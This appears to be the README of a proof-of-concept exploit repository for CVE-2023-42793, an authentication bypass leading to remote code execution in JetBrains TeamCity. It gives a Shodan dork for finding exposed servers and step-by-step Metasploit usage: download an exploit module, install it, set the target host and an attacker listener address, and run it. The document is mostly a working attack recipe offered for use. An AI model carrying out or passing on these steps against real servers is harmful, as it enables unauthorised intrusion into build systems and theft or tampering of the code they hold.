# CVE-2023-42793

![](https://img.shields.io/static/v1?label=Product&message=JetBrains%20TeamCity%20Server&color=blue)
![](https://img.shields.io/static/v1?label=Version&message=All%20versions%20of%20TeamCity%20prior%20to%20version%202023.05.4&color=brighgreen)
![](https://img.shields.io/static/v1?label=Vulnerability&message=CVSSv3:9.8.%20Remote%20Code%20Execution&color=red)

## Shodan Dork:
```
TeamCity-Node-Id: MAIN_SERVER
```

## Description

In JetBrains TeamCity before 2023.05.4 authentication bypass leading to RCE on TeamCity Server was possible


### Usage

### Metasploit Framework
```
wget https://raw.githubusercontent.com/getdrive/PoC/main/2023/JetBrains_RCE/jetbrains_teamcity_rce_cve_2023_42793.rb
```
```
cp jetbrains_teamcity_rce_cve_2023_42793.rb /usr/share/metasploit-framework/modules/exploits/multi/http/jetbrains_teamcity_rce_cve_2023_42793.rb
```
```
msfdb reinit; msfconsole -q
```
```
use exploits/multi/http/jetbrains_teamcity_rce_cve_2023_42793.rb
```
```
set RHOSTS target_IP
```
```
set lhost attacker_IP
```
```
run
```

